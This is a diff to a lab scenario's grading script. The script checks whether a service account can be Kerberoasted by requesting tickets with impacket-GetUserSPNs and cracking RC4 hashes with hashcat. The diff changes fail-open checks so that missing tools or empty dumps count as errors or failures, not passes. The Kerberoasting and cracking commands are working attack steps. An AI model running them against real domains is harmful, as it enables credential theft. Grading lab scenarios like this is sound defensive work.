@@ -2,9 +2,21 @@
 # meta4/ad-vm/scenario-03/verify-poc.sh
 # PASS (exit 0) iff svc_sql is not RC4-Kerberoastable with a seed wordlist.
 
-set -euo pipefail
+set -uo pipefail
 
-cd "$(mktemp -d)"
+# Tool preflight. /usr/bin/impacket-GetUserSPNs did not exist on the attacker
+# -- the provisioner symlinked pip names pip never creates, into a directory
+# the scenarios never call -- so the "no RC4 TGS in dump" branch below fired on
+# every run and this scenario reported PASS on a fully vulnerable box.
+# A missing grader dependency is a harness error, never a pass.
+for t in /usr/bin/impacket-GetUserSPNs; do
+    if [ ! -x "$t" ]; then
+        echo "[verify-poc-03] HARNESS ERROR: $t missing or not executable" >&2
+        exit 2
+    fi
+done
+
+cd "$(mktemp -d)" || { echo "[verify-poc-03] HARNESS ERROR: mktemp failed" >&2; exit 2; }
 
 /usr/bin/impacket-GetUserSPNs \
     -request -dc-ip 10.20.30.5 \
@@ -29,10 +41,13 @@ if grep -qE '\$krb5tgs\$18' ks.hashes && ! grep -qE '\$krb5tgs\$23\$' ks.hashes;
     exit 0
 fi
 
-# Need an RC4 hash to attempt offline crack. Without RC4 = blocked.
+# No RC4 hash and no recognised denial. This is NOT evidence of remediation:
+# an empty ks.hashes is exactly what a broken or unreachable probe produces.
+# The AES-only case is a genuine fix and is caught by the branch above.
 if ! grep -qE '\$krb5tgs\$23\$' ks.hashes; then
-    echo "[verify-poc-03] no RC4 TGS in dump -- BLOCKED"
-    exit 0
+    echo "[verify-poc-03] no RC4 TGS and no recognised denial - INCONCLUSIVE, grading FAIL" >&2
+    echo "[verify-poc-03] an empty TGS dump is not proof that Kerberoasting was blocked" >&2
+    exit 1
 fi
 
 # Seed wordlist with the inject password + common rotations.
@@ -49,8 +64,9 @@ Service24
 EOF
 
 if ! command -v hashcat >/dev/null 2>&1; then
-    echo "[verify-poc-03] hashcat unavailable; cannot validate crack -- BLOCKED"
-    exit 0
+    echo "[verify-poc-03] HARNESS ERROR: hashcat unavailable; cannot validate crack" >&2
+    echo "[verify-poc-03] hashcat is in Kali's repo and belongs in the attacker image" >&2
+    exit 2
 fi
 
 CRACK=$(timeout 45 hashcat -m 13100 -a 0 --quiet --potfile-path=/dev/null ks.hashes wl 2>&1 || true)
@@ -65,5 +81,15 @@ if echo "$CRACK" | grep -qE '\$krb5tgs\$23\$.*:[A-Za-z0-9!]+$'; then
     exit 1
 fi
 
-echo "[verify-poc-03] RC4 hash dumped but pwd uncracked in seed wordlist -- BLOCKED"
+# An RC4 TGS was obtained but the seed wordlist did not crack it.
+#
+# This grades as BLOCKED by design: scenario-03's stated remediation set
+# includes strengthening the service account password, so surviving the
+# wordlist is a legitimate fix alongside the AES-only path handled above.
+#
+# The weakness is acknowledged: the verdict depends on wordlist coverage
+# rather than purely on configuration. If phase 4a tightens this scenario,
+# the cleaner design is to grade on "is an RC4 TGS obtainable at all" and move
+# password strength to a separate scenario -- see the notes in threat.md.
+echo "[verify-poc-03] RC4 hash dumped but pwd survived the seed wordlist -- PoC BLOCKED"
 exit 0
